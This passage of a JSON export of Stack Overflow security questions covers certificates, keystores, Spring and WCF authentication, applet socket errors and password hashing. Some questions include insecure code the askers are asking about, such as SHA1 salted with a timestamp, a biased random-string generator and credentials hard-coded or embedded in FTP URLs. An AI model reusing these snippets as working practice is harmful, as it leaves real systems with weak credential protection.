message:</p>\n\n<pre><code>An error occurred during a connection to www.rzim.org.\n\nPeer's Certificate has been revoked.\n\n(Error code: sec_error_revoked_certificate)\n</code></pre>\n\n<p>My only \"lead\" online was concerning intermediate certificates. Any thoughts are greatly appreciated. Thanks!</p>\n"},{"tags":["java","security","java-ee","weblogic","administration"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":81,"score":2,"question_id":12200619,"title":"Hide private keys etc from administrators","body":"<p>Currently I take part in developing a system based on Java EE (WebLogic server, to be more precise) and I am wondering how to protect some private data from administrators. For example, some parts of a system stores credentials for legacy systems in a deployment descriptors as plain text and this is bad because a deployer can read application configuration file (<code>ejb-jar.xml</code>, for example) and steal username and password for powerfull account. I want to close this security hole, but don't know how.</p>\n\n<p>Now I am interested in protecting this kind of data:</p>\n\n<ol>\n<li>Login</li>\n<li>Password</li>\n<li>Private key for symmetric encryption</li>\n</ol>\n\n<p>From <a href=\"http://kingsfleet.blogspot.com/2008/12/storing-password-somewhere-safe.html\" rel=\"nofollow\">here</a> I've discovered that I can use a JCEKS keystore to protect this type of information, but I can not understand how to use it. My application still should contain the kestore password and the key password to access it. So, a depoyer can steal passwords for keystores and keys, find my secure storage and steal credetials. Obviously, I can revoke <code>read</code> privileges from the deployer account, but then he can decompile my appliaction and develop his own similar app (or edit my one), that simply prints secure data to some file or send it by email... And now I am stuck... </p>\n\n<p>Can anybody give me some links that can explain how to protect a system from administrators? Weblogic related links will be preferable. I totally understand that it is not possible to protect from all administrators and there should be some <code>security administrator</code> that will be responsible for keystore management and so forth, but I want to secure all sensitive data from everybody else.</p>\n\n<p><strong>RESULTS</strong> </p>\n\n<p>Both <em>jtahlborn</em>'s and <em>slim</em>'s answers are correct, but <em>slims</em>'s answer in more interesting. I think that in my case it will be appropriate to accept only signed applications for installation on the server. This decidion can solve problem with applicatoin modifications done by a administrator. Administrators will have password from keystore and all keys, but they will not have access to keystore file at all. Access to keystore file will have only special security administrators ('rw') and server ('r'). So, everybody will have the key, but nobody (except security administrators) will have access to the box.</p>\n"},{"tags":["spring","security","authentication","authorization","external"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":211,"score":1,"question_id":12366763,"title":"Spring security only for authorization. External authentication","body":"<p>As title says, i'm developing a web application that receives user authentication infos from an external application. A spring controller of my app gets user info and stores it in session. I want to authenticate this user inside Spring Security and then use his roles to grant/deny access to urls like</p>\n\n<pre><code>&lt;intercept-url pattern=\"/myprotectedpage*\" access=\"hasRole('rightrole')\" /&gt;\n</code></pre>\n\n<p>I read some tutorials speaking about PRE_AUTH_FILTER and UserDetailsService but i can't get the point. What is the application lifecycle of Spring Security? Which classes are involved?\nI need some full working samples.</p>\n"},{"tags":["objective-c","ios","security"],"answer_count":5,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":329,"score":3,"question_id":10252080,"title":"Is this a good way to generate a random string on iPhone?","body":"<p>Here's the code I came up with:</p>\n\n<pre><code>NSString *randomString = @\"\";\nfor (int x=0;x&lt;NUMBER_OF_CHARS;x++) {\n  randomString = [randomString stringByAppendingFormat:@\"%c\", (char)(65 + (arc4random() % 25))];\n}\nreturn randomString;\n</code></pre>\n\n<p><strong>EDIT:</strong></p>\n\n<p>To answer the comments:</p>\n\n<p>1) I'm mostly concerned with brevity of code. </p>\n\n<p>2) I also wonder if this is secure against guessing the string, and/or proof against collisions, if NUMBER_OF_CHARS is a high number (say 40) - not for this application, but in other cases. </p>\n\n<p>3) Also, is there is a faster way if I want to make a ton of strings some day? This seems like it will be slow, since it makes an object each time through the loop.</p>\n"},{"tags":["php","security","hash","sha1"],"answer_count":7,"favorite_count":4,"up_vote_count":10,"down_vote_count":0,"view_count":12891,"score":10,"question_id":3897434,"title":"Password security: sha1, sha256 or sha512","body":"<p>After knowing that hashing a password is my choice for making a login form. Now I am facing another issue - sha1, sha256 or sha512?</p>\n\n<p>This is a standard method using salt I think I got it from a reference book of mine,</p>\n\n<pre><code># create a salt using the current timestamp\n$salt = time();\n\n# encrypt the password and salt with SHA1\n$usr_password = sha1($usr_password.$salt);\n</code></pre>\n\n<p>but then after I have done some research on sha1, it was told it may not be so secure in the future, suggesting using hash().</p>\n\n<p>But I don't quite understand using hash() - for instance - </p>\n\n<pre><code>$usr_password = hash('sha256', $usr_password); \n</code></pre>\n\n<p>what is that 'sha256' or 'sha512' which I found it here?</p>\n\n<p><a href=\"http://hungred.com/useful-information/php-better-hashing-password/\">http://hungred.com/useful-information/php-better-hashing-password/</a></p>\n\n<p>can I put anything instead, like '@123'?</p>\n\n<p>why is it called salt anyway - $salt = time(); is nothing else but just a unix timestamp isn't it?</p>\n\n<p>thanks!</p>\n"},{"tags":["web-services","security","access-token","prestashop"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":128,"score":0,"question_id":12354850,"title":"prestashop api security","body":"<p>I'm about to build an iOS e-commerce app. This app will query the prestashop webservice api of an existing prestashop installation.\nI've been playing with the prestashop webservice and it seems to work fairly good so far except for lacking of security: there's no token-like architecture that I can use to track authentication of users. Is it me missing something or Prestashop DOES lack this feature?\nWhat would be your approach? Is there any module that I can install and solve this problem? I really really would like to limit as much as possible coding extensions for prestashop by hand.\nThanks</p>\n"},{"tags":["android","security","galaxy","keypad"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":139,"score":1,"question_id":12363190,"title":"Smaller/Customized In Call DialPad for Android (Samsung S3)","body":"<p>Preface:\nI moved to the S3 from an old flip phone with a small keypad with which I could easily type things like a telephone banking passcode or the like, shielding one hand with the other as I typed.</p>\n\n<p>With the S3 smartphone, the dialpad is huge, making it hard to shield one hand with the other, and the required finger movement is too great and too easily observed.</p>\n\n<p>Question:\nIs there any way to either:\n(A) Shrink the size of the \"in call\" dialpad used by the S3, through any means, even a screen scaler or spliiter, or\n(B) Achieve a similar end using a custom dialer?</p>\n\n<p>If I rotate the phone to landscape mode, I do get a nice sized, smaller dialer initially, but once I enter the call (say, voicemail), it jumps back to portrait mode and the stock dialer.  From the research I've already done on custom dialers, it seems that they don't work once a call starts, so I'm not too hopeful.</p>\n\n<p>Is the only solution to root the phone and hack it very deep? (Obviously, anything can be done with a rooted phone if you know what you're doing.)</p>\n"},{"tags":["security","passwords","salt"],"answer_count":6,"favorite_count":7,"up_vote_count":9,"down_vote_count":0,"view_count":897,"score":9,"question_id":2583203,"title":"Salt, passwords and security","body":"<p>I've read through many of the questions on SO about this, but many answers contradict each other or I don't understand.</p>\n\n<p>You should always store a password as a hash, never as plain text.\nBut should you store the salt (unique for each user) next to the hashed password+salt in the database. This doesn't seem very clever to me as couldn't someone gain access to the database, look for says the account called Admin or whatever and then work out the password from that?</p>\n"},{"tags":["java","android","security","pkcs#11"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":63,"score":2,"question_id":12354137,"title":"Is Sun PKCS#11 provider supported on Android?","body":"<p>Is Sun PKCS#11 provider supported on Android? Or can it be moved to Android somehow? </p>\n\n<p>Thank you.</p>\n"},{"tags":["spring","security","integration","cas","delegation"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12362020,"title":"Spring Security Delegating Authentication to CAS","body":"<p>I was looking through the questions between CAS and Spring Security, but I have not found the exact situation for this. My question is in regards with Setting up Spring Security to have it's users based off CAS.</p>\n\n<p>Currently, we are modifying CAS to access the users itself, however, the app is guarded by Spring Security. As of now, CAS - Spring Security seems to delegate that we make our own custom UserService to get the users, but what If the users are from CAS itself? </p>\n\n<p>Is there a way to recognize that when CAS finds the credentials valid, then Spring Security will also agree with it and do nothing? Or is that not how it should work?</p>\n\n<p>What are your suggestions to remedy this problem?</p>\n"},{"tags":["image","security","tiff"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12361766,"title":"How to write some TIFF tags into an existing image","body":"<p>I want to test the tiff format on our codec and want to cover 100% space for all fields. However, i cannot write the following fields into any existing image (CCIT G3/4, bi-level, grayscale, palette and RGB) using any software i find so far (exiftool, exiv2, tiffset - libtiff tools):</p>\n\n<ul>\n<li>GrayResponseUnit</li>\n<li>GrayResponseCurve</li>\n<li>FreeByteCounts</li>\n<li>FreeByteOffsets</li>\n<li>TransferFunctions</li>\n<li>TransferRange</li>\n<li>InkNames</li>\n<li>SMinSampleValues</li>\n<li>SMaxSampleValues</li>\n</ul>\n\n<p>For example in exiftool I get:</p>\n\n<pre><code>exiftool -v3 -TransferFunction+=1 football_seal.tif \nAdding XMP-tiff:TransferFunction if tag exists\nShifting IFD0:TransferFunction if tag exists\n======== football_seal.tif\nRewriting football_seal.tif...\n  Editing tags in: IFD0 TIFF XMP \n  Creating tags in: \n  FileType = TIFF\n  MIMEType = image/tiff\n  ExifByteOrder = MM\n  Rewriting IFD0\n  Copying 16 image data blocks\nNothing changed in football_seal.tif\n   0 image files updated\n   1 image files unchanged\n</code></pre>\n\n<p>For certain values I get:</p>\n\n<pre><code>exiftool -v3 -SMinSampleValue+=5 football_seal.tif \nSorry, SMinSampleValue is not writable\nWarning: Sorry, SMinSampleValue is not writable\nNothing to do.\n</code></pre>\n\n<p>Alternatively, is it possible to generate a file with these attributes from other software like photoshop/gimp?</p>\n"},{"tags":["java","javascript","security","applet"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":12361369,"title":"applet method calling from javascript","body":"<p>I have an applet to upload some files from specific folder and delete them,but something is wrong when I call an applet function from my javascript code, when I call that function from init() it works fine.\nmy applet code :</p>\n\n<pre><code>public class Uploader extends Applet {\n   String serverPath;\n   String clientPath;\n   private JSObject win;\n   @Override\n   public void init() {\n       serverPath = getParameter(\"serverPath\");\n       clientPath = getParameter(\"clientPath\");\n       try {\n           win = JSObject.getWindow(this);\n       } catch (JSException e) {\n           log.warning(\"Can't access JSObject object\");\n       }\n       upload(topic,clientPath);\n   }\n   public void upload(String topic,String clientPath) {\n       log.log(Level.SEVERE, \"upload functiond\");\n       DefaultHttpClient client = new DefaultHttpClient();\n       MultipartEntity form = new MultipartEntity();\n       log.log(Level.SEVERE, \"upload functiond2\");\n       try {\n            File directory = new File(clientPath);\n            log.log(Level.SEVERE, \"upload functiond2.2\");\n            File[] files = directory.listFiles();\n            log.log(Level.SEVERE, \"upload functiond2.5\");\n            int i = 0;\n            for (File file : files) {\n                log.log(Level.SEVERE, \"upload functiond2.6\");\n                i++;\n                form.addPart(\"file\" + String.valueOf(i), new FileBody(file));\n                System.out.println(\"adding file \" + String.valueOf(i) + \" \" + file);\n                log.log(Level.SEVERE, \"adding file \" + String.valueOf(i) + \" \" + file);\n            }\n            log.log(Level.SEVERE, \"upload functiond3\");\n            form.addPart(\"topic\", new StringBody(topic, Charset.forName(\"UTF-8\")));\n            form.addPart(\"action\", new StringBody(action, Charset.forName(\"UTF-8\")));\n            form.addPart(\"path\", new StringBody(serverPath, Charset.forName(\"UTF-8\")));\n            HttpPost post = new HttpPost(serverPath);\n      ....\n</code></pre>\n\n<p>and this is my javascript code:</p>\n\n<pre><code>document.applet.upload(title,\"c:\\scan\");\n</code></pre>\n\n<p>when I called from javascript only log <code>log.log(Level.SEVERE, \"upload functiond2.2\");</code> printed.</p>\n\n<p>note that when I call from init method of applet it works fine.   </p>\n\n<p>I wrap my code into a privilagedAction ,but  goes only one step forward and hang on <code>log.log(Level.SEVERE, \"upload functiond2.5\");</code> </p>\n"},{"tags":["php","security","passwords"],"answer_count":3,"favorite_count":0,"up_vote_count":6,"down_vote_count":4,"view_count":76,"score":2,"question_id":12353447,"title":"What is the point of encrypting passwords in a database?","body":"<p>Could someone please confirm the following for me:</p>\n\n<p>Is the point of encrypting passwords when saving them into a database that if the database is hacked into then the hacker won't be able to know the actual passwords, unless s/he has the algorithm and salt etc to decrypt it, and therefore won't be able to compromise this or other accounts using the same password?</p>\n\n<p>But my main query is: presumably the password is encrypted in, for example, the PHP script that saves the password into the database, and therefore the algorithm to decrypt the password is clear in that script. So is it correct that if the hacker hacked into the server or content management system for the website s/he would be able to access that script and decrypt the passwords?</p>\n\n<p>So essentially the encryption is only as relevant as your login information to your online CMS or server is strong?</p>\n\n<p>Thanks in advance!</p>\n"},{"tags":["java","security","openssl","privatekey","pem"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":100,"score":0,"question_id":12359525,"title":"How do i read the private key in java from a pfx certificate","body":"<p>I am trying to read a private key  i java .I learned inorder to do that i have to extract  private key from my full certificate in pfx format.\nI have tried  the below open ssl command to convert pfx to pem and then to pk8 , but when i tried to read the key in java , it says invalid key format </p>\n\n<p>convert pfx to pem</p>\n\n<pre><code>      openssl pkcs12 -in C:\\Documents\\xbox-token\\conversion\\xbox\n  token-FullCert.pfx -nocerts -out C:\\Documents\\xbox-token\\conversion\\xboxkey.pem\n</code></pre>\n\n<p>Removing password protection</p>\n\n<pre><code>openssl rsa -in C:\\Documents\\xbox-token\\conversion\\xboxkey.pem  -out C:\\Documents\\xbox-token\\conversion\\xboxkey.pem\n</code></pre>\n\n<p>Convert pem to pk8 </p>\n\n<pre><code>openssl pkcs8 -topk8 -in C:\\Documents\\xbox-token\\conversion\\xboxkey.pem -out C:\\Documents\\xbox-token\\conversion\\xboxprv.pk8\n</code></pre>\n\n<p>In the java code </p>\n\n<pre><code>  byte[] encodedPrivateKey=null;\n    File privateKeyFile = new File(\"C:/Documents/xbox-token/conversion/xboxprv.pk8\");\n    FileInputStream inputStreamPrivateKey = null;\n    try {\n        inputStreamPrivateKey = new FileInputStream(privateKeyFile);\n          encodedPrivateKey = new byte[(int)privateKeyFile.length()];\n            inputStreamPrivateKey.read(encodedPrivateKey);\n            inputStreamPrivateKey.close();\n    } catch (FileNotFoundException e) {\n        // TODO Auto-generated catch block\n        e.printStackTrace();\n    } catch (IOException e) {\n        // TODO Auto-generated catch block\n        e.printStackTrace();\n    }\n\n\n    // Create the private key.\n    PKCS8EncodedKeySpec privateKeySpec = new PKCS8EncodedKeySpec(encodedPrivateKey);\n    System.out.println(encodedPrivateKey);\n    System.out.println(privateKeySpec);\n    RSAPrivateKey privateKey = null;\n    try {\n        privateKey = (RSAPrivateKey)KeyFactory.getInstance(\"RSA\").generatePrivate(privateKeySpec);\n    } catch (InvalidKeySpecException e) {\n        // TODO Auto-generated catch block\n        e.printStackTrace();\n    } catch (NoSuchAlgorithmException e) {\n        // TODO Auto-generated catch block\n        e.printStackTrace();\n    }\n</code></pre>\n\n<p>I am getting an java.security.spec.InvalidKeySpecException: java.security.InvalidKeyException: invalid key format</p>\n\n<p>Can any one help </p>\n"},{"tags":["ios","security","file","encryption"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":129,"score":0,"question_id":12359513,"title":"How can I protect my iOS app against tools like iFunbox","body":"<p>I have an iOS app in which I download files to local storage. I've done the following to keep these local files secure:\n- Store them outside the documents folder (I use the library folder)\n- Use complete file encryption</p>\n\n<p>But today I came across iFunbox. This is a tool that enables you to browse the filesystem of your iOS device without a jailbreak! What I noticed that if the device is unlocked I can browse all the files in the sandbox. Fortunately when the device is locked the files become inaccessible. </p>\n\n<p>What I was wondering if there is anything I can do to further protect these files when the device itself is unlocked? So how can I protect my files from tools like iFunbox? </p>\n"},{"tags":["c#","security","email","passwords","client"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":84,"score":3,"question_id":12359445,"title":"How to secure password in code c# email client","body":"<p>I am building a website for my brother's company. The most important element on the website is the mail function.  It is important that visitors can send emails to my brother using that system. So I used this code:</p>\n\n<pre><code>message.From = new MailAddress(\"someemail@somedomain.com\");\nmessage.To.Add(new MailAddress(\"emailaddress\"));\nmessage.CC.Add(new MailAddress(\"emailaddress\"));\nSmtpClient client = new SmtpClient(\"smtp.live.com\", 587);\nclient.EnableSsl = true;\nclient.Credentials = new System.Net.NetworkCredential(\"emailaddress\",\"password\");\nclient.Send(message);\n</code></pre>\n\n<p>The code is working fine, but there is one problem: I need to fill in my password and I don't want to do that.  Is there a way to use something like MD5 hashes or something else to secure my password?</p>\n"},{"tags":["wcf","web-services","security","windows-authentication"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12359391,"title":"Disable Windowsauthentication WCF","body":"<p>I'm using WCF to create a Client-Server Application and I'm having some problems with authentication, with wsHttpBinding Windowsauthentication seems to be turned on by default. The webservice worked perfectly inside my network but when I installed it somewhere else I suddenly had all these securityexceptions. </p>\n\n<p>Though I want the webservice to be encrypted with https, i dont want windows authentication. </p>\n\n<p>Although I can't try it at the moment I've found this Configuration:</p>\n\n<pre><code>&lt;security mode=\"Transport\"&gt;\n        &lt;transport clientCredentialType=\"Certificate\" /&gt;\n      &lt;/security&gt;\n</code></pre>\n\n<p>Which might do the trick. This is my \"old\" one:</p>\n\n<pre><code>&lt;security mode=\"Message\"&gt;\n        &lt;transport clientCredentialType=\"Windows\" proxyCredentialType=\"None\" realm=\"\" /&gt;\n        &lt;message clientCredentialType=\"Windows\" negotiateServiceCredential=\"true\" algorithmSuite=\"Default\" /&gt;\n      &lt;/security&gt;\n</code></pre>\n\n<p>This is the configuration on the client side which i dont quite understand cause anybody could just change this easily. I'd expect to configure this on the server side but i havent yet found out how.</p>\n\n<p>Ideas?</p>\n"},{"tags":["asp.net","security","rest","asp.net-mvc-4","asp.net-web-api"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":81,"score":2,"question_id":12355261,"title":"ASP.NET Web API Persistent Cookie","body":"<p>I have a REST service that a user will authenticate with, that I'm porting from WCF REST services.  With WCF Rest, there were problems when persisting the user with a cookie, and instead I had to use the database and create a ticket system.  Is there support for cookies in Web API where I can create a persistent ticket like I would in MVC or web forms for a user, or do the same problems persist with web API too?</p>\n\n<p>Thanks.</p>\n"},{"tags":["php","security","hacking","password-recovery","phishing"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12355943,"title":"Need a way to identify a user if the user got incontact regarding they're account being hacked?","body":"<p>I am developing a PHP application which has user accounts, I have followed best practices for security (so have done my part) - but this will obviouslly not stop accounts from being hacked.</p>\n\n<p>This is just me forward thinking, but see the following scenario:</p>\n\n<blockquote>\n  <p>Let's say a user was silly enough to get there account hacked by\n  writing down there password (which someone found - the '<em>hacker</em>'...).</p>\n  \n  <p>Due to the hacker getting the password, the hacker logs in and changes\n  it and also changes the email.</p>\n  \n  <p>Now the user finds out (due to them not being able to log in nor\n  recover/reset their pass)...</p>\n  \n  <p>The user then decides to report this to staff (as they want to regain control of the account).</p>\n</blockquote>\n\n<p>How would I (a member of staff) be able to indentify the person who is reporting is the actual user, so I can help him/her?</p>\n\n<p>Anyone can just give a username (and maybe email - if they know the person)...</p>\n\n<p>I had an idea on maybe; a memorable word which is required to be given upon registeration (and can not be changed)...to help indentify the user.</p>\n\n<p>There must be other sites which have similar procedures/functionality in place...</p>\n\n<p>Your thoughts? and any example code would be nice!</p>\n\n<p>PS: This is not a high security financial site, more of a social network for gamers.</p>\n"},{"tags":["security","internet-explorer","ssl"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":63,"score":1,"question_id":12349685,"title":"SSL: Insecure Content IE","body":"<p>I'm currently building a website for our business, where the website is expected to work perfectly, even back to the earlier IEs down to 7.</p>\n\n<p>URL - <a href=\"https://secure.marietta.at\" rel=\"nofollow\">https://secure.marietta.at</a></p>\n\n<p>The page does not load any insecure content in Chrome, but I can see in IE that there is a GET param sent to <a href=\"http://marietta.at\" rel=\"nofollow\">http://marietta.at</a>, which in turn redirects to <a href=\"http://en.marietta.at\" rel=\"nofollow\">http://en.marietta.at</a></p>\n\n<p>I have no idea where I've specified this. I tried deleting scripts, checking the css, debugging with IE's own debugging tool and in HttpWatch Studio. I can't find the offending piece of code.</p>\n\n<p>Are there any particular gotchas in IE that might trigger this warning?</p>\n"},{"tags":["ajax","security","user-registration"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12353739,"title":"security concerns while using ajax for user registration form","body":"<p>Just wanted to know whether it is safe to use ajax for registering a user in a website, since registration is one of those things that should be the most secure. If it is safe enough, what are the security precautions to be taken while doing so. (i've heard most of the security holes occur because of sloppy coding practices).</p>\n"},{"tags":["ruby","security","authentication","encryption","redis"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":76,"score":1,"question_id":12334536,"title":"which redis datatype is suitable for storing users?","body":"<p>I am building an authentication system in ruby, and using redis for storing users' access data. I like to know which of <a href=\"http://redis.io/topics/data-types\" rel=\"nofollow\">redis datatypes</a> is more suitable to use? </p>\n"},{"tags":["java","security","sockets","applet","accesscontrolexception"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":80,"score":0,"question_id":12345201,"title":"Getting Java Sockets Connecting","body":"<p>I have a problem that started occuring after I updated Java (I think) When I try and connect to my Cpp server (that seems to work just fine) I get an error message I can't find any help with.</p>\n\n<p>Below are the error messages</p>\n\n<pre><code>java.security.AccessControlException: access denied\n(\"java.net.SocketPermission\" \"127.0.0.1:4000\" \"connect,resolve\")\n    at java.security.AccessControlContext.checkPermission(AccessControlContext.java:366)\n    at java.security.AccessController.checkPermission(AccessController.java:555)\n    at java.lang.SecurityManager.checkPermission(SecurityManager.java:549)\n    at java.lang.SecurityManager.checkConnect(SecurityManager.java:1051)\n    at java.net.Socket.connect(Socket.java:574)\n    at java.net.Socket.connect(Socket.java:528)\n    at java.net.Socket.&lt;init&gt;(Socket.java:425)\n    at java.net.Socket.&lt;init&gt;(Socket.java:208)\n    at jclientbare.init(jclientbare.java:27)\n    at sun.applet.AppletPanel.run(AppletPanel.java:434)\n    at java.lang.Thread.run(Thread.java:722)\n</code></pre>\n\n<p>The Java source code follows</p>\n\n<pre><code>import java.awt.*;\nimport java.applet.*;\nimport java.io.*;\nimport java.net.*;\nimport javax.swing.*;\n\npublic class jclientbare extends Applet {\n\n\n    static BufferedReader in;\n    static PrintStream out;\n\n    public void init()  {\n\n         try    {\n                System.out.println(\"Test NN\");\n            Socket socket = new Socket( \"localhost\", 4000 );\n        in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            out = new PrintStream( socket.getOutputStream(), true);\n         }\n\n         catch (UnknownHostException e) {\n\n        JOptionPane.showMessageDialog(null, \"Unknown Host..\");\n            System.out.println(\"Unknown host: kq6py\");\n\n           } catch  (IOException e) {\n\n        JOptionPane.showMessageDialog(null, \"NO IO.\");\n            System.out.println(\"No I/O\");\n         }\n     }\n\n}\n</code></pre>\n\n<p>The Java applet doesn't register a connection it just bombs with the error message.  Any help would be appreciated!  I think it may be a issue with the java.policy but I don't know exactly how to fix it.</p>\n\n<p>Uhh, how do you do a stack trace?</p>\n"}]}
{"total":17772,"page":16,"pagesize":100,"questions":[{"tags":["java","security","jsse"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12346042,"title":"Migrating a certificate keystore to another JVM","body":"<p>I am working on a installer which needs a JRE and creates certificates as well. I am working on the next version of installer which bundles a new JRE. I need to move all the certificates that are imported in <a href=\"http://docs.oracle.com/javase/1.4.2/docs/tooldocs/windows/keytool.html#cacerts\" rel=\"nofollow\">cacerts</a> keystore of the old JRE to a new JRE. Will the existing certificates in cacerts be valid if I copy the \"cacerts\" file under old jre/lib/security/ directory to the new JRE, I will be installing. </p>\n\n<p>I looked at question: <a href=\"http://stackoverflow.com/questions/7492220/is-it-possible-to-import-all-contents-of-cacerts-into-a-jssecacerts-file\">\"Is it possible to import all contents of cacerts into a jssecacerts file?\"</a> to import certificates into my keystore. Does this mean I need to backup the existing jre/lib/security/cacerts and import it to new JRE if the keystore migration by copying cacerts will not work?  </p>\n"},{"tags":["asp.net","security","paypal","ssl-certificate","paypal-sandbox"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12346559,"title":"Check For a Server Certificate asp.net Paypal","body":"<p>We have a website that have a Donate functionality \nSo we integrate with Paypal\nAfter the user donates on PayPal , Paypal sends a request to our website that confirms the truncation \nSo how to check if the request is coming from Paypal , How to check for the certificate provided by Paypal or just check on the Request.Request.Uri\nBecause if i did not do this check any one can spoof and send a request with the parameters sent by PayPal confirming any fake transactions  </p>\n"},{"tags":["php","security","joomla","web-security","joomla1.5"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":101,"score":4,"question_id":12346830,"title":"Joomla : Can a super administrator get the ftp password of that site (from configuration file or any other way)?","body":"<p>I have access to a joomla 1.5 made site's backend as super administrator. Now what i want to do is, take that site down and set a simple html file as the site homepage. To do that i think i need ftp user/pass. Is there any way to get that pass from joomla backend? I can see some entries in Help>System info>Configuration file  where $ftp_user:'xxxxxx' and $ftp_pass: 'xxxxxx'. Is there any way to know these values?\nEven if i can't get the ftp user/pass, can i edit/browse any file/directory using joomla backend in some way?</p>\n"},{"tags":["java","javascript","security","sockets"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":149,"score":0,"question_id":12345383,"title":"java, javascript signed applet (file choosing, ftp upload) security/socket exception","body":"<p>I've got a java applet that uses a class with 3 functions ( not counting test functions ): </p>\n\n<ul>\n<li>One for running file chooser and add selected files ( type FileContents ) to an array.</li>\n<li>Second to remove some of that files from array if necessary.</li>\n<li><p>Third one is for upload files to an ftp server.</p>\n\n<p>All of them are called from <code>Javascript</code> code. Two first functions works just fine.\nUpload function is not working, It throws:</p></li>\n</ul>\n\n<blockquote>\n  <p>java.security.AccessControlException: access denied\n  (\"java.net.SocketPermission\" (dest. ftp server) \"resolve\")</p>\n</blockquote>\n\n<p>Applet is self signed. I'm using <code>[Yii Framework][1]</code>. <br/>\n<strong>Important code:- Uploader upload function:</strong></p>\n\n<pre><code>public void upload( String ftpServer, String username, String password, String filePath )\nthrows MalformedURLException, IOException\n{\n    if ( ftpServer != null &amp;&amp; filePath != null &amp;&amp; this.filesArray.length &gt; 1 ) {\n        StringBuffer sb = new StringBuffer( \"ftp://\" );\n        //check for authentication, if username and password not provided assume annonymous access\n        if ( username != null &amp;&amp; password != null ) {\n            sb.append( username );\n            sb.append( ':' );\n            sb.append( password );\n            sb.append( '@' );\n        }\n\n        sb.append( ftpServer );\n        sb.append( \":21\" );\n        sb.append( '/' );\n\n        if ( !filePath.equals( \"\" ) ) {\n            sb.append( filePath );\n            sb.append( '/' );\n        }\n\n        StringBuffer sb2 = new StringBuffer( sb.toString() );\n        //below: i &lt; this.filesArray.length - 1 becouse last field is always empty\n        for ( int i = 0; i &lt; this.filesArray.length - 1; i++ ){ \n            sb.append( this.filesArray[ i ].getName() );\n            sb.append( \";type=i\" );\n\n            BufferedInputStream bis = null;\n            BufferedOutputStream bos = null;\n\n            try {\n                URL url = new URL( sb.toString() );\n                URLConnection urlConn = url.openConnection();\n\n                bos = new BufferedOutputStream( urlConn.getOutputStream() );\n                bis = new BufferedInputStream( this.filesArray[ i ].getInputStream() );\n\n                int j;\n                //read byte by byte until end of stream\n                while ( ( j = bis.read() ) != -1 ) {\n                    bos.write( j );\n                }\n            }\n            finally {\n                if ( bis != null ) {\n                    try {\n                        bis.close();\n                    }\n                    catch( IOException ioe ) {\n                        ioe.printStackTrace();\n                    }\n                }\n                if ( bos != null ) {\n                    try {\n                        bos.close();\n                    }\n                    catch ( IOException ioe ) {\n                        ioe.printStackTrace();\n                    }\n                }\n            }\n            sb = sb2;\n        }\n    }\n    else {\n        System.out.println( \"Ftp address incorrect or input file not available.\" );\n    }\n}\n</code></pre>\n\n<p><strong>Deploy code</strong>: </p>\n\n<pre><code>    &lt;script&gt;\nvar attributes = { id:'uploader1Applet',\n    code: 'filesUpload.uploaderApplet',\n    archive:'&lt;?php echo Yii::app()-&gt;getBaseUrl(true); ?&gt;/java/uploaderApplet.jar',  width:1, height:1} ;\n\n\nvar parameters = {jnlp_href: '&lt;?php echo Yii::app()-&gt;getBaseUrl(true);?&gt;/java/upload-applet.jnlp'};   \n\n\n     deployJava.runApplet(attributes, parameters, '1.6') ;\n</code></pre>\n\n<p></p>\n\n<ul>\n<li><strong>javascript declaration + initialization ( initialize only job is to assign new FileContents array to Uploader property; same view as above, different script ):</strong></li>\n</ul>\n\n<blockquote>\n<pre><code>var uploader = document.getElementById( 'uploader1Applet' ).getUploader();\n      uploader.initialize();\n</code></pre>\n</blockquote>\n\n<ul>\n<li><strong>upload method call ( same script as Uploader declaration + initialization) :</strong></li>\n</ul>\n\n<blockquote>\n  <p>uploader.upload( connAddress, connUsername, '&lt; ? php echo\n  Yii::app()->session[ 'ftpPassword' ]; ?>', connRootFolder != null ?\n  connRootFolder : \"\" );</p>\n</blockquote>\n\n<p>Any ideas how to solve my problem ?</p>\n"},{"tags":["c#","wcf","security"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12346015,"title":"WCF security and client error","body":"<p>i have created a wcf service with Message security mode enabled this is my \nservice </p>\n\n<pre><code>    [ServiceContract]\n    public interface IMessagingServices\n    {\n        [OperationContract]\n        string SendMessage(string from, string to, string message);\n\n        [OperationContract]\n        List&lt;Message&gt; GetMessages(string from, string to);\n\n        [OperationContract]\n        int DeleteMessages(int[] idList);\n    }\n}\n</code></pre>\n\n<p>and this is it's config</p>\n\n<pre><code>&lt;bindings&gt;\n      &lt;wsHttpBinding&gt;\n        &lt;binding name=\"wsBinding1\"&gt;\n          